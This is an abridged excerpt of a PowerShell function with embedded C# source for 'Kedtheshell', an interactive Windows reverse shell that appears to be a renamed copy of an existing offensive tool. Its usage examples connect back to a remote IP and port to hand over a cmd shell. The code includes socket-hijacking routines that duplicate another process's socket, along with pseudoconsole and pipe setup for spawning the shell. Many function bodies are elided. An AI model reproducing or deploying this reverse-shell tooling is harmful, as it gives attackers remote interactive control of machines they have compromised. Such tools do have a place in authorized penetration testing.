function Invoke-Kedtheshell
{   
    <#
        .SYNOPSIS
            Kedtheshell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/Kedtheshell
        ...
        .EXAMPLE  
            PS>Invoke-Kedtheshell 10.0.0.2 3001
        ...
        .EXAMPLE
            PS>Invoke-Kedtheshell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
         ...
         .EXAMPLE
            PS>Invoke-Kedtheshell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
        ...
        .EXAMPLE
            PS>Invoke-Kedtheshell -Upgrade -Rows 30 -Cols 90
    ...
    $parametersKedtheshell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    Add-Type -TypeDefinition $Source -Language CSharp;
    $output = [KedtheshellMainClass]::KedtheshellMain($parametersKedtheshell)
    Write-Output $output
}
...
public class KedtheshellException : Exception
{
    private const string error_string = "[-] KedtheshellException: ";

    public KedtheshellException() { }

    public KedtheshellException(string message) : base(error_string + message) { }
}
...
public static class SocketHijacking
{
    ...
    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        ...
        if (targetSocketHandle == IntPtr.Zero)
            throw new KedtheshellException("No sockets found, so no hijackable sockets :( Exiting...");
    ...
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        ...
        if (result == -1)
            throw new KedtheshellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}
...
public struct ParentProcessUtilities
{
    ...
    public static Process GetParentProcess(IntPtr handle)
    {
        ...
        if (status != 0)
            throw new KedtheshellException(status.ToString());
        try
        {
...
public static class Kedtheshell
{
    private const string errorString = "{{{KedtheshellException}}}\r\n";
    ...
    private static void InitWSAThread()
    {
        ...
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new KedtheshellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }
    ...
    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        ...
        {
            throw new KedtheshellException("Specified port is invalid: " + remotePort.ToString());
        }
        ...
        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            ...
            throw new KedtheshellException(String.Format("WSAConnect failed with error code: {0}", error));
        }
    ...
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        ...
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new KedtheshellException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new KedtheshellException("Could not create the OutputPipe");
    }
    ...
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        ...
        {
            throw new KedtheshellException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new KedtheshellException("Could not enable virtual terminal processing");
        }
    }
    ...
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        {
            throw new KedtheshellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new KedtheshellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new KedtheshellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    ...
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        ...
        if (!success)
        {
            throw new KedtheshellException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    ...
    public static string SpawnKedtheshell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
            ...
            if (upgradeShell)
            {
                ...
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    ...
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        ...
                        {
                            throw new KedtheshellException("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else
                        {
        ...
        output += "Kedtheshell kindly exited.\r\n";
        return output;
    }
}

public static class KedtheshellMainClass
{
    ...
    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new KedtheshellException("\r\nKedtheshell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }
    ...
    private static string CheckRemoteIpArg(string ipString)
    {
        ...
        if (!IPAddress.TryParse(ipString, out address))
            throw new KedtheshellException("\r\nKedtheshell: Invalid remoteIp value" + ipString);
        return ipString;
    }
    ...
    private static int CheckInt(string arg)
    {
        ...
        if (!Int32.TryParse(arg, out ret))
            throw new KedtheshellException("\r\nKedtheshell: Invalid integer value " + arg);
        return ret;
    }
    ...
    public static string KedtheshellMain(string[] args)
    {
        string output = "";
        ...
        else
        {
            ...
            try
            {
                ...
                output = Kedtheshell.SpawnKedtheshell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
...
class MainClass
{
    ...
    {
        Console.Out.Write(KedtheshellMainClass.KedtheshellMain(args));
    }
}
